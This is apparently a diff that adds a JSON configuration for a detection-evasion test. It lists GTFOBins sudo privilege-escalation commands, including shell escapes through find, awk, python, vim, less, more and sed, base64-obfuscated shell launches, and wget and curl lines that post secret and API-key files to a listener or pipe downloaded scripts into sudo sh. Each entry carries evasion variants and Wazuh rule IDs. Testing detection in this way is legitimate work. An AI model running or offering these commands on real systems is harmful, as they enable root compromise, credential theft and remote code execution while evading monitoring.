@@ -1,0 +1,128 @@
+{
+  "gtfobins_techniques": {
+    "find": {
+      "basic_command": "sudo find /etc -name '*.conf' -exec /bin/sh \\;",
+      "evasion_variants": [
+        "sudo find /tmp -name 'nonexistent' -exec /bin/bash \\; 2>/dev/null",
+        "sudo find /usr -maxdepth 1 -type f -exec sh -c 'exec \"$@\"' _ /bin/sh \\;",
+        "sudo find . -exec /bin/sh -p \\; -quit",
+        "sudo find /etc -name '*.conf' -exec sh -c 'echo whoami | sh' \\;"
+      ],
+      "description": "Find command with -exec for shell execution",
+      "wazuh_rules": [5402, 5403, 80700]
+    },
+    "awk": {
+      "basic_command": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
+      "evasion_variants": [
+        "sudo awk 'BEGIN {system(\"sh\")}'",
+        "sudo awk 'BEGIN {cmd=\"/bin/sh\"; system(cmd)}'",
+        "echo | sudo awk '{system(\"/bin/bash\")}'",
+        "sudo awk -f <(echo 'BEGIN{system(\"/bin/sh\")}')"
+      ],
+      "description": "AWK system command execution",
+      "wazuh_rules": [5402, 5712, 80700]
+    },
+    "python": {
+      "basic_command": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
+      "evasion_variants": [
+        "sudo python3 -c 'import subprocess; subprocess.call([\"/bin/sh\"])'",
+        "sudo python3 -c '__import__(\"os\").system(\"/bin/bash\")'",
+        "sudo python3 -c 'exec(\"import os\\nos.system(\\\"/bin/sh\\\")\")'",
+        "sudo python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"
+      ],
+      "description": "Python command execution for privilege escalation",
+      "wazuh_rules": [5402, 18101, 18102]
+    },
+    "vim": {
+      "basic_command": "sudo vim -c ':!/bin/sh' -c ':q!'",
+      "evasion_variants": [
+        "sudo vim -c ':shell' -c ':q!'",
+        "sudo vim -c ':!bash' -c ':q!'",
+        "sudo vim -c 'set shell=/bin/sh' -c ':shell' -c ':q!'",
+        "echo ':!/bin/sh' | sudo vim -"
+      ],
+      "description": "Vim editor shell escape technique",
+      "wazuh_rules": [5402, 5551]
+    },
+    "base64": {
+      "basic_command": "echo 'L2Jpbi9zaA==' | base64 -d | sudo sh",
+      "evasion_variants": [
+        "echo 'L2Jpbi9iYXNo' | base64 -d | sudo bash",
+        "sudo base64 -d <<< 'L2Jpbi9zaA==' | sh",
+        "echo 'c2g=' | base64 -d | sudo xargs -I {} {} -c 'whoami'",
+        "printf 'L2Jpbi9zaA==' | base64 -d | sudo sh"
+      ],
+      "description": "Base64 decode with shell execution",
+      "wazuh_rules": [5402, 80700, 80702]
+    },
+    "less": {
+      "basic_command": "sudo less /etc/passwd",
+      "interactive_command": "!/bin/sh",
+      "evasion_variants": [
+        "sudo less /etc/hosts",
+        "sudo less /var/log/auth.log",
+        "echo '/bin/sh' | sudo less",
+        "sudo less -f /dev/stdin <<< '/bin/sh'"
+      ],
+      "description": "Less pager shell escape",
+      "wazuh_rules": [5402, 5551]
+    },
+    "wget": {
+      "basic_command": "sudo wget --post-file=/tmp/secret_password.txt http://127.0.0.1:8000/",
+      "evasion_variants": [
+        "sudo wget --post-data='$(cat /tmp/api_key.txt)' http://127.0.0.1:8000/",
+        "sudo wget -O- --post-file=/tmp/db_config.txt http://127.0.0.1:8000/",
+        "sudo wget --header='X-Data: '$(cat /tmp/secret_password.txt) http://127.0.0.1:8000/",
+        "sudo wget -q --post-file=/var/log/app/config.log http://127.0.0.1:8000/"
+      ],
+      "description": "Wget file exfiltration or download-exec",
+      "wazuh_rules": [5402, 31101, 31102]
+    },
+    "curl": {
+      "basic_command": "curl -s http://127.0.0.1:8000/payload.sh | sudo sh",
+      "evasion_variants": [
+        "sudo curl -d @/tmp/secret_password.txt http://127.0.0.1:8000/",
+        "curl http://127.0.0.1:8000/script | sudo bash",
+        "sudo curl --data-binary @/tmp/api_key.txt http://127.0.0.1:8000/",
+        "curl -X POST --data-urlencode 'data='$(sudo cat /tmp/db_config.txt) http://127.0.0.1:8000/"
+      ],
+      "description": "Curl download-execute or data exfiltration",
+      "wazuh_rules": [5402, 31101, 80700]
+    },
+    "more": {
+      "basic_command": "sudo more /etc/passwd",
+      "interactive_command": "!/bin/sh",
+      "evasion_variants": [
+        "sudo more /etc/hosts",
+        "sudo more /var/log/syslog",
+        "echo '/bin/sh' | sudo more",
+        "sudo more < /dev/stdin <<< '/bin/sh'"
+      ],
+      "description": "More pager shell escape",
+      "wazuh_rules": [5402, 5551]
+    },
+    "sed": {
+      "basic_command": "sudo sed -n '1e /bin/sh' /etc/passwd",
+      "evasion_variants": [
+        "sudo sed '1e sh' /etc/hosts",
+        "echo | sudo sed '1e /bin/bash'",
+        "sudo sed -e '1e /bin/sh' /dev/null",
+        "printf '' | sudo sed 'e /bin/sh'"
+      ],
+      "description": "Sed command execution with e flag",
+      "wazuh_rules": [5402, 80700, 80702]
+    }
+  },
+  "evaluation_config": {
+    "max_attempts_per_technique": 5,
+    "detection_window_seconds": 60,
+    "evasion_success_threshold": 0.7,
+    "targets": ["target-1", "target-2", "target-3"],
+    "sensitive_files": [
+      "/tmp/secret_password.txt",
+      "/tmp/api_key.txt", 
+      "/tmp/db_config.txt",
+      "/var/log/app/config.log"
+    ]
+  }
+}
